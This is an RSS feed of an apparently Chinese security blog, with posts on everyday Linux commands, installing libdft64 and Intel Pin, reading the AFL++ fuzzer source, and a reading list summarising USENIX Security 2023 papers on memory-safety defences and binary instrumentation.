<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>alazymachine</title>
        <link>https://alazymechnaic.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Tue, 05 Sep 2023 17:14:20 +0800</pubDate>
        <lastBuildDate>Tue, 05 Sep 2023 17:14:20 +0800</lastBuildDate>
        <category>paper</category>
        <category>HEAP PWN CTF</category>
        <category>pwn</category>
        <category>Linux</category>
        <category>Paper</category>
        <category>fuzz</category>
        <category>bypass</category>
        <category>clash</category>
        <category>go, RE</category>
        <category>kernel pwn</category>
        <category>binary</category>
        <category>personal</category>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/09/05/libdft64/</guid>
            <title></title>
            <link>https://alazymechnaic.github.io/2023/09/05/libdft64/</link>
            <pubDate>Tue, 05 Sep 2023 17:14:20 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/09/05/useful-command/</guid>
            <title>Useful_command</title>
            <link>https://alazymechnaic.github.io/2023/09/05/useful-command/</link>
            <category>Linux</category>
            <pubDate>Tue, 05 Sep 2023 15:15:02 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;tar&#34;&gt;&lt;a href=&#34;#tar&#34; class=&#34;headerlink&#34; title=&#34;tar&#34;&gt;&lt;/a&gt;tar&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 打包操作&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;tar&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-cvf&lt;/span&gt; archive.tar file1 file2 &lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;.

&lt;span class=&#34;token comment&#34;&gt;# -c表示创建打包文件，-v表示显示详细的操作信息，-f指定打包文件的名称。archive.tar是打包文件的名称，file1 file2 ...是要添加到打包文件中的文件或目录的列表。可以根据需要添加多个文件或目录&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# 解包操作&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;tar&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-xvf&lt;/span&gt; archive.tar
&lt;span class=&#34;token function&#34;&gt;tar&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-xvf&lt;/span&gt; archive.tar &lt;span class=&#34;token parameter variable&#34;&gt;-C&lt;/span&gt; target_directory&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;du&#34;&gt;&lt;a href=&#34;#du&#34; class=&#34;headerlink&#34; title=&#34;du&#34;&gt;&lt;/a&gt;du&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 查看文件大小用量&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;du&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-sh&lt;/span&gt; ./target_file&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;intel-pin&#34;&gt;&lt;a href=&#34;#intel-pin&#34; class=&#34;headerlink&#34; title=&#34;intel pin&#34;&gt;&lt;/a&gt;intel pin&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 编译可供32位可执行文件使用的pintool&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;make&lt;/span&gt; obj-ia32/inscount0.so &lt;span class=&#34;token assign-left variable&#34;&gt;TARGET&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ia32
&lt;span class=&#34;token comment&#34;&gt;# 编译可供64位可执行文件使用的pintool&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;make&lt;/span&gt; obj-intel64/inscount0.so &lt;span class=&#34;token assign-left variable&#34;&gt;TARGET&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;intel64
&lt;span class=&#34;token comment&#34;&gt;# 对目标程序进行插装&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;/&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;/&lt;span class=&#34;token punctuation&#34;&gt;..&lt;/span&gt;/pin &lt;span class=&#34;token parameter variable&#34;&gt;-t&lt;/span&gt; obj-intel64/inscount0.so &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; inscount0.log -- /bin/ls&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/09/03/libdft/</guid>
            <title>libdft</title>
            <link>https://alazymechnaic.github.io/2023/09/03/libdft/</link>
            <pubDate>Sun, 03 Sep 2023 16:24:26 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;libdft64&#34;&gt;&lt;a href=&#34;#libdft64&#34; class=&#34;headerlink&#34; title=&#34;libdft64&#34;&gt;&lt;/a&gt;libdft64&lt;/h2&gt;&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FuZ29yYUZ1enplci9saWJkZnQ2NA==&#34;&gt;https://github.com/AngoraFuzzer/libdft64&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;安装踩坑&#34;&gt;&lt;a href=&#34;#安装踩坑&#34; class=&#34;headerlink&#34; title=&#34;安装踩坑&#34;&gt;&lt;/a&gt;安装踩坑&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;# 设置pin
进入libdft64中执行 ./install_pin.sh
# 手动执行
Please set:
export PIN_ROOT=/home/harry/pin-3.20-98437-gf02b61307-gcc-linux
# 编译安装
make&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;使用踩坑&#34;&gt;&lt;a href=&#34;#使用踩坑&#34; class=&#34;headerlink&#34; title=&#34;使用踩坑&#34;&gt;&lt;/a&gt;使用踩坑&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 官方给出的使用方法如下&lt;/span&gt;
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/08/30/afl-fuzz-diy/</guid>
            <title>afl_fuzz_DIY</title>
            <link>https://alazymechnaic.github.io/2023/08/30/afl-fuzz-diy/</link>
            <category>fuzz</category>
            <pubDate>Wed, 30 Aug 2023 16:38:13 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;AFL&#34;&gt;&lt;a href=&#34;#AFL&#34; class=&#34;headerlink&#34; title=&#34;AFL ++&#34;&gt;&lt;/a&gt;AFL ++&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;​	本文介绍如何利用AFL Plus Plus实现自定义目标的模糊测试。&lt;/p&gt;
&lt;p&gt;Tutorials ： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0FGTHBsdXNwbHVzL0FGTHBsdXNwbHVzL2Jsb2Ivc3RhYmxlL2RvY3MvdHV0b3JpYWxzLm1k&#34;&gt;https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/tutorials.md&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;AFL源码阅读&#34;&gt;&lt;a href=&#34;#AFL源码阅读&#34; class=&#34;headerlink&#34; title=&#34;AFL源码阅读&#34;&gt;&lt;/a&gt;AFL源码阅读&lt;/h2&gt;&lt;pre class=&#34;line-numbers language-c&#34; data-language=&#34;c&#34;&gt;&lt;code class=&#34;language-c&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;// afl-fuzz.h: line 431&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 该结构用于存储本次afl运行所需要的上下文内容&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;afl_state&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;/* Position of this state in the global states list */&lt;/span&gt;
  u32 _id&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

  &lt;span class=&#34;token class-name&#34;&gt;afl_forkserver_t&lt;/span&gt; fsrv&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;sharedmem_t&lt;/span&gt;      shm&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;sharedmem_t&lt;/span&gt;     &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;shm_fuzz&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;token class-name&#34;&gt;afl_env_vars_t&lt;/span&gt;   afl_env&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;	
  &lt;span class=&#34;token comment&#34;&gt;//...&lt;/span&gt;
&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;afl_state_t&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// afl-fuzz-init.c 该函数的目的是使用原始输入执行程序&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;perform_dry_run&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;afl_state_t&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;afl&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;// afl-forkserver.c &lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;// 该函数用于进行子程序的执行&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;fsrv_run_result_t&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;__attribute__&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;hot&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;afl_fsrv_run_target&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;afl_forkserver_t&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;fsrv&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; u32 timeout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;
                    &lt;span class=&#34;token keyword&#34;&gt;volatile&lt;/span&gt; u8 &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;stop_soon_p&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;
&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://alazymechnaic.github.io/2023/08/22/sec-paper-list/</guid>
            <title>Sec_paper_list</title>
            <link>https://alazymechnaic.github.io/2023/08/22/sec-paper-list/</link>
            <category>Paper</category>
            <pubDate>Tue, 22 Aug 2023 10:00:57 +0800</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;安全相关论文及博客汇总&#34;&gt;&lt;a href=&#34;#安全相关论文及博客汇总&#34; class=&#34;headerlink&#34; title=&#34;安全相关论文及博客汇总&#34;&gt;&lt;/a&gt;安全相关论文及博客汇总&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&#34;安全会议&#34;&gt;&lt;a href=&#34;#安全会议&#34; class=&#34;headerlink&#34; title=&#34;安全会议&#34;&gt;&lt;/a&gt;安全会议&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;NDSS&lt;/strong&gt;：  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmRzcy1zeW1wb3NpdW0ub3JnL25kc3MyMDIzL2FjY2VwdGVkLXBhcGVycy8=&#34;&gt;https://www.ndss-symposium.org/ndss2023/accepted-papers/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ACM CCS&lt;/strong&gt;： &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2lnc2FjLm9yZy9jY3MvQ0NTMjAyMy8=&#34;&gt;https://www.sigsac.org/ccs/CCS2023/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;USENIX&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MjMv&#34;&gt;https://www.usenix.org/conference/usenixsecurity23/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;S&amp;amp;P&lt;/strong&gt;: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaWVlZS1zZWN1cml0eS5vcmcvVEMvU1AyMDIzL3Byb2dyYW0tcGFwZXJzLmh0bWw=&#34;&gt;https://www.ieee-security.org/TC/SP2023/program-papers.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;更新活跃的安全媒体&#34;&gt;&lt;a href=&#34;#更新活跃的安全媒体&#34; class=&#34;headerlink&#34; title=&#34;更新活跃的安全媒体&#34;&gt;&lt;/a&gt;更新活跃的安全媒体&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;先知社区&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tLw==&#34;&gt;https://xz.aliyun.com/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全客&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tLw==&#34;&gt;https://www.anquanke.com/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;360 核心安全技术博客&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9ncy4zNjAubmV0Lw==&#34;&gt;https://blogs.360.net/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术博客&#34;&gt;&lt;a href=&#34;#技术博客&#34; class=&#34;headerlink&#34; title=&#34;技术博客&#34;&gt;&lt;/a&gt;技术博客&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;知道创宇&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLw==&#34;&gt;https://paper.seebug.org/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;棱角社区&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2ZvcnVtLTU5LTEuaHRtbA==&#34;&gt;https://forum.ywhack.com/forum-59-1.html&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;奇安信攻防社区&lt;/strong&gt;：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L2NvbW11bml0eS9hbGwvbmV3ZXN0&#34;&gt;https://forum.butian.net/community/all/newest&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Personal Blog&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;游戏安全：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucGVyZmFyZS5uZXQv&#34;&gt;https://www.perfare.net/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;逆向工程：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90aW55aGFjay5jb20v&#34;&gt;https://tinyhack.com/&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;漏洞分析：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ndG9hZC5naXRodWIuaW8v&#34;&gt;https://gtoad.github.io/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;usenix&#34;&gt;&lt;a href=&#34;#usenix&#34; class=&#34;headerlink&#34; title=&#34;usenix&#34;&gt;&lt;/a&gt;usenix&lt;/h2&gt;&lt;h3 id=&#34;Viper-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks&#34;&gt;&lt;a href=&#34;#Viper-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks&#34; class=&#34;headerlink&#34; title=&#34;Viper: Spotting Syscall-Guard Variables for Data-Only Attacks&#34;&gt;&lt;/a&gt;Viper: Spotting Syscall-Guard Variables for Data-Only Attacks&lt;/h3&gt;&lt;p&gt;由于控制流保护技术得到广泛应用，攻击者很难修改控制数据，如函数指针，以劫持程序的控制流。相反，仅针对数据的攻击会破坏安全关键的非控制数据（关键数据），并且可以绕过所有的控制流保护措施，实施严重的攻击。以前的研究已经探索了各种方法来帮助构建或防止仅针对数据的攻击。然而，目前还没有解决方案能够自动检测程序特定的关键数据。&lt;/p&gt;
&lt;p&gt;在本文中，我们确定了一个重要的关键数据类别，即系统调用保护变量（syscall-guard variables），并提出了一组解决方案，以可扩展的方式自动检测此类变量。系统调用保护变量决定是否调用与安全相关的系统调用（syscalls），修改它们将允许攻击者向操作系统请求额外的特权。我们提出了分支强制（branch force）的方法，在执行过程中有意地翻转每个条件分支，并检查是否调用了新的与安全相关的系统调用。如果是这样，我们通过常见的内存错误进行数据流分析，估计翻转这些分支的可行性。我们构建了一个名为VIPER的工具来实现我们的想法。VIPER成功地从13个程序中检测到了34个以前未知的系统调用保护变量。我们对sqlite和v8进行了四种新的仅针对数据的攻击，可以执行任意命令或删除任意文件。VIPER在大多数程序中在五分钟内完成分析，显示了其用于发现系统调用保护变量的实用性。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvdXNlbml4c2VjdXJpdHkyMy15ZS5wZGY=&#34;&gt;usenixsecurity23-ye.pdf&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Not-All-Data-are-Created-Equal-Data-and-Pointer-Prioritization-for-Scalable-Protection-Against-Data-Oriented-Attacks&#34;&gt;&lt;a href=&#34;#Not-All-Data-are-Created-Equal-Data-and-Pointer-Prioritization-for-Scalable-Protection-Against-Data-Oriented-Attacks&#34; class=&#34;headerlink&#34; title=&#34;Not All Data are Created Equal: Data and Pointer Prioritization for Scalable Protection Against Data-Oriented Attacks&#34;&gt;&lt;/a&gt;&lt;strong&gt;Not All Data are Created Equal: Data and Pointer Prioritization for Scalable Protection Against Data-Oriented Attacks&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;数据导向的攻击在大多数操作系统中对最先进的防御措施变得越来越现实和有效。这些攻击操纵内存中的数据对象（数据和指针），而不改变程序的控制流。用于保护数据和指针的软件和硬件防御措施由于对所有数据对象的过度插装而遭受性能瓶颈的困扰。在这项工作中，我们提出了一种基于规则启发的数据和指针优先级（Data and Pointer Prioritization，DPP）框架，用于自动识别应用程序中的敏感内存对象，并仅保护那些敏感数据，利用现有的防御措施。我们使用Linux Flaw Project数据集、Juliet测试套件和五个用于演示数据导向攻击的真实世界程序来评估我们框架的正确性。我们的实验结果表明，DPP可以通过优先处理仅占总数据对象数量3-4%的对象来识别我们测试应用程序中的易受攻击的数据对象。我们对SPEC CPU2017整数基准套件的评估结果显示，启用了DPP的AddressSanitizer（ASan）在保护所有优先级数据对象的同时，可以将性能（吞吐量）提高1.6倍，并将运行时开销减少70%，相比默认的ASan。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly95YW9ncm91cC5jcy52dC5lZHUvZHBwLXVzZW5peC0yMy5wZGY=&#34;&gt;dpp-usenix-23.pdf (vt.edu)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;sAFer-Efficient-and-Error-Tolerant-Binary-Instrumentation&#34;&gt;&lt;a href=&#34;#sAFer-Efficient-and-Error-Tolerant-Binary-Instrumentation&#34; class=&#34;headerlink&#34; title=&#34;sAFer: Efficient and Error-Tolerant Binary Instrumentation&#34;&gt;&lt;/a&gt;&lt;strong&gt;sAFer: Efficient and Error-Tolerant Binary Instrumentation&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;最近在二进制插桩方面的进展主要集中在性能方面。通过静态转换代码以避免额外的运行时操作，诸如Egalito和RetroWrite等系统实现了接近零的开销。这些静态转换的安全性依赖于几个假设：(a)无错误和完整的反汇编，(b)独占使用位置无关代码，(c)代码指针识别既没有误报也没有漏报。这些假设的违反可能导致插桩程序崩溃，甚至更糟糕的是，出现延迟故障导致数据损坏或安全受损。许多早期的二进制插桩技术（如DynamoRio、Pin和BinCFI）最小化了这些假设，但代价是更高的开销，尤其是对于间接调用密集（例如C++）的应用程序。因此，一个开放的研究问题是是否可以将早期的安全性优点与最近的性能优点相结合。我们以肯定的回答这个问题，提出了一种新的插桩技术，它(a)容忍使用位置相关代码和常见的反汇编和静态分析错误，(b)在运行时检测假设违规，以防止出现未定义行为。我们的方法提供了一种优雅关闭或恢复的故障崩溃机制。我们在不牺牲性能的情况下实现了安全的插桩，开销约为2%左右。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY2xhYi5jcy5zdW55c2IuZWR1L3NlY2xhYi9wdWJzL3NhZmVyLnBkZg==&#34;&gt;safer.pdf (sunysb.edu)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;Reassembly-is-Hard-A-Reflection-on-Challenges-and-Strategies&#34;&gt;&lt;a href=&#34;#Reassembly-is-Hard-A-Reflection-on-Challenges-and-Strategies&#34; class=&#34;headerlink&#34; title=&#34;Reassembly is Hard: A Reflection on Challenges and Strategies&#34;&gt;&lt;/a&gt;&lt;strong&gt;Reassembly is Hard: A Reflection on Challenges and Strategies&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	重组（Reassembly）是静态二进制重写的一个分支，如今已成为研究的焦点。然而，尽管它被广泛使用并引起了研究的兴趣，但目前还没有对重组技术和挑战进行系统的调查。在本文中，我们正式定义了当前现有的重组器中出现的不同类型的错误，并提出了一个名为REASSESSOR的自动化工具来发现这些错误。我们试图通过我们的工具和我们创建的大规模基准测试来展示当前领域面临的挑战以及如何解决这些挑战。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjNzdW1tZXJfNDM5LWtpbV9oeXVuZ3Nlb2stcHJlcHViLnBkZg==&#34;&gt;sec23summer_439-kim_hyungseok-prepub.pdf (usenix.org)&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;FloatZone-Accelerating-Memory-Error-Detection-using-the-Floating-Point-Unit&#34;&gt;&lt;a href=&#34;#FloatZone-Accelerating-Memory-Error-Detection-using-the-Floating-Point-Unit&#34; class=&#34;headerlink&#34; title=&#34;FloatZone: Accelerating Memory Error Detection using the Floating Point Unit&#34;&gt;&lt;/a&gt;&lt;strong&gt;FloatZone: Accelerating Memory Error Detection using the Floating Point Unit&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	内存消毒器（Memory sanitizers）是检测空间和时间内存错误（如缓冲区溢出和使用释放后内存）的强大工具。模糊测试器和软件测试人员通常依赖这些工具来发现错误的存在。然而，消毒器会产生显著的运行时开销。例如，最广泛使用的消毒器——地址消毒器（Address Sanitizer，ASan）会导致2倍的减速。这种开销的主要来源是消毒器检查，其中至少涉及内存查找、比较和条件分支指令。将这些检查应用于确认程序中内存访问的有效性会大大减慢执行速度。&lt;/p&gt;
&lt;p&gt;​	我们引入了FloatZone，一种基于编译器的消毒器，使用轻量级检查利用浮点单元（FPU）来检测C/C++程序中的空间和时间内存错误。我们展示了通过单个浮点加法触发下溢异常来实现“查找、比较和分支”的综合效果，以检测内存违规访问。这种新颖的检测方法通过避免传统比较的缺点大大提高了性能：它防止了分支预测错误，通过卸载到FPU实现更高的指令级并行性，并且由于没有阴影内存，降低了缓存失效率。&lt;/p&gt;
&lt;p&gt;我们的评估结果显示，FloatZone在SPEC CPU2006和CPU2017上只产生37%的运行时开销。此外，与现有技术相比，我们测量到的模糊测试吞吐量平均增加了2.87倍。最后，我们确认FloatZone在Juliet测试套件和一系列OSS-Fuzz错误上提供了与ASan相媲美的检测能力。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvdXNlbml4c2VjdXJpdHkyMy1nb3J0ZXIucGRm&#34;&gt;usenixsecurity23-gorter.pdf&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;PUMM-Preventing-Use-After-Free-Using-Execution-Unit-Partitioning&#34;&gt;&lt;a href=&#34;#PUMM-Preventing-Use-After-Free-Using-Execution-Unit-Partitioning&#34; class=&#34;headerlink&#34; title=&#34;PUMM:Preventing Use-After-Free Using Execution Unit Partitioning&#34;&gt;&lt;/a&gt;&lt;strong&gt;PUMM:Preventing Use-After-Free Using Execution Unit Partitioning&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;​	关键软件通常使用内存不安全的编程语言编写，容易受到使用释放后内存和双重释放错误的威胁。这导致了对内存分配器的提案，通过策略性地延迟内存重新分配的时间，使这类错误无法被利用。然而，现有的解决方案存在运行时和内存开销高的问题。为了寻求更好的解决方案，我们提出通过对程序进行分析来识别与处理各个任务相关的代码单元。基于这样的直觉，在运行时，不应该或者几乎不应该在不同任务之间传递数据，因此，释放的内存重新分配被延迟到当前执行单元完成之后，仅仅足够长的时间来防止使用释放后内存的利用。&lt;/p&gt;
